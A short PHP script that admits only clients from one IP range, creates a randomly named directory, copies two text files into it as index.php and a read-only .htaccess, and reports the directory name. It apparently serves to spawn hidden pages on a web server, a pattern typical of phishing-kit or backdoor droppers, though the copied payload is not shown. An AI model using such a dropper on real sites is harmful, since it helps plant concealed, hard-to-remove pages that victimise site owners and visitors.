<?php

$allowedIPRange = '193.23.0.0/16';
$clientIP = $_SERVER['REMOTE_ADDR'];

if (!ipInRange($clientIP, $allowedIPRange)) {
    header('HTTP/1.0 403 Forbidden');
    exit('Error 403: Forbidden');
}

$dirName = generateRandomName(20);
$dirPath = __DIR__ . '/' . $dirName;

if (!mkdir($dirPath, 0755, true)) {
    exit('Failed to create directory');
}

copy('a.txt', $dirPath . '/index.php');
copy('ht.txt', $dirPath . '/.htaccess');
chmod($dirPath . '/.htaccess', 0444);

echo 'Directory name: ' . $dirName;

function ipInRange($ip, $range)
{
    list($subnet, $mask) = explode('/', $range);
    $ipLong = ip2long($ip);
    $subnetLong = ip2long($subnet);
    $maskLong = ~((1 << (32 - $mask)) - 1);

    return ($ipLong & $maskLong) == ($subnetLong & $maskLong);
}

function generateRandomName($length)
{
    $characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $name = '';

    for ($i = 0; $i < $length; $i++) {
        $name .= $characters[rand(0, strlen($characters) - 1)];
    }

    return $name;
}
?>
